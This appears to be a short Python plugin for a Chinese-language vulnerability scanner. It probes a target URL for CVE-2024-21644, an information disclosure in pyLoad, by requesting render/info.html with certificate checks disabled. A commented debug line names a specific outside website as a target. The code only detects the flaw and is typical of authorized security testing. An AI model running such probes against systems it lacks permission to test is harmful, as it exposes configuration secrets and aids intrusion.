import requests
import re
from bs4 import BeautifulSoup
import logging

uia = ''
http = ''
https = ''
def dl201(dl):
    global http,https
    http=dl
    https=dl
def ty(url,s_cookie=None):
    global uia
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        logging.captureWarnings(True)
        #-------------------------------以下可修改
        headers = {
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        gf = requests.get(url+'render/info.html',cookies=s_cookie,headers=headers,proxies=proxies,verify=False)
        if gf.status_code == 200 and "Config" in gf.text and "DEBUG" in gf.text:
            uia = '[+]漏洞存在\nrender/info.html'
        else:
            uia='[-]漏洞不存在'
        # -------------------------------
    except Exception as aaa:
        uia = '[-]请求错误\n' + str(aaa)
#----------------调试
# ty('https://stahovatko.linuxhelp.cz/')
# print(uia)
#----------------
def yt1():
    global uia
    return '--------------------------------------------------\n[pyload CVE-2024-21644 信息泄露 ]\n\n'+ str (uia)+'\n'
def yt1a(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        ty(url1,s_cookie)
    elif pd=='1':
        ty(url1,s_cookie)